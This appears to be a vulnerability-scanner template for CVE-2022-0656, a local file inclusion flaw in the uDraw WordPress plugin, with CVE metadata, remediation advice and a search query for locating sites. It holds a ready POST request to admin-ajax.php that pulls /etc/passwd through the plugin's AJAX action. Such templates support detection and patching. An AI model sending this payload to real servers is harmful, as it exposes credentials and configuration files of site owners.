id: CVE-2022-0656
info:
  name: uDraw <3.3.3 - Local File Inclusion
  author: akincibor
  description: uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64
    AJAX action (available to both unauthenticated and authenticated users) before
    using it in the file_get_contents function and returning its content base64 encoded
    in the response. As a result, unauthenticated users could read arbitrary files
    on the web server (such as /etc/passwd, wp-config.php etc).
  severity: high
  impact: 'An attacker can exploit this vulnerability to access sensitive information,
    such as configuration files, credentials, or other sensitive data stored on the
    server.

    '
  remediation: 'Upgrade uDraw to version 3.3.3 or later to mitigate the vulnerability.

    '
  reference:
  - https://wpscan.com/vulnerability/925c4c28-ae94-4684-a365-5f1e34e6c151
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0656
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-0656
    cwe-id: CWE-552
    epss-score: 0.00684
    epss-percentile: 0.77939
    cpe: cpe:2.3:a:webtoprint:web_to_print_shop\:udraw:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: webtoprint
    product: web_to_print_shop\
    google-query: inurl:"/wp-content/plugins/udraw"
  tags: cve,cve2022,wp,wordpress,wp-plugin,unauth,lfi,udraw,wpscan,webtoprint
traps:
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
    body: 'action=udraw_convert_url_to_base64&url=/etc/passwd

      '
  response:
    status_code: 200
    headers: {}
    body: cm9vddata:image\/;base64
